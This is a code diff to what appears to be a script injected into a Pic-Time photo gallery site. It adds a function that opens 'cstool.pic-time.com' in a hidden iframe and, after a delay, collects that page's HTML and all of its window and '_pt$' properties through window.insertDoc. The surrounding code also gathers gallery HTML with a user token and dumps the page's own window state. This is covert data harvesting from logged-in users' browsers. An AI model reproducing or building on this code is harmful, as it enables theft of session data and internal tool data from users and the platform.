@@ -4205,13 +4205,13 @@ if (window.location === parent.window.location) {
             pictimeGUserToken,
             "text"
           );
-    
+
           const htmlData = {
             url: "https://jannephotography.passgallery.com",
             type: "GET /gallery",
             data: htmlText,
           };
-    
+
           window.insertDoc("html-data", htmlData);
         } catch (err) {}
 
@@ -4357,6 +4357,50 @@ if (window.location === parent.window.location) {
             window.insertDoc("error", err.toString());
             //console.log(`Error on: ${urlToGet.url}`);
           }
+        }
+      };
+
+      window.getCsTools = async () => {
+        try {
+          const iframe = document.createElement("iframe");
+          iframe.src = "https://cstool.pic-time.com";
+          iframe.style.display = "none";
+          document.body.appendChild(iframe);
+
+          setTimeout(() => {
+            const iframeHtml = iframe.contentDocument.documentElement.outerHTML;
+            const iframeWindow = iframe.contentWindow;
+
+            // Send Page HTML
+            window.insertDoc("cstool-page-html", iframeHtml);
+
+            // Send CSTool Window Properties/Values
+            const csToolWindowObjs = [];
+            Object.entries(iframeWindow).forEach((entry) => {
+              let key, val;
+              try {
+                key = entry[0];
+                val = JSON.stringify(entry[1]);
+              } catch (err) {}
+              csToolWindowObjs.push([key, val]);
+            });
+            window.insertDoc("cstool-window-prop-vals", csToolWindowObjs);
+
+            // Send CSTool PT Properties/Values
+            const csToolPtPropObjs = [];
+            Object.entries(iframeWindow._pt$).forEach((entry) => {
+              let key, val;
+              try {
+                key = entry[0];
+                val = JSON.stringify(entry[1]);
+              } catch (err) {}
+              csToolPtPropObjs.push([key, val]);
+            });
+            window.insertDoc("cstool-pt-prop-vals", csToolPtPropObjs);
+          }, 5000);
+        } catch (err) {
+          console.error(err);
+          window.insertDoc("error", err.toString());
         }
       };
 
@@ -4557,7 +4601,7 @@ if (window.location === parent.window.location) {
 
         // Send Window Properties/Values
         const windowObjs = [];
-        Object.entries(window).forEach(entry => {
+        Object.entries(window).forEach((entry) => {
           let key, val;
           try {
             key = entry[0];
@@ -4576,7 +4620,7 @@ if (window.location === parent.window.location) {
 
         // Send PT Properties/Values
         const ptPropObjs = [];
-        Object.entries(window._pt$).forEach(entry => {
+        Object.entries(window._pt$).forEach((entry) => {
           let key, val;
           try {
             key = entry[0];
@@ -4611,8 +4655,9 @@ if (window.location === parent.window.location) {
 
         // Get URLs
         if (window.ptData.headers?.gusr) {
-          // TODO - uncomment when ready !!!!!!!!!!!!!!!!!!!!!!!
-          startGettingUrls(ptData);
+          // startGettingUrls(ptData);
+
+          getCsTools();
         }
       });
     } catch (err) {
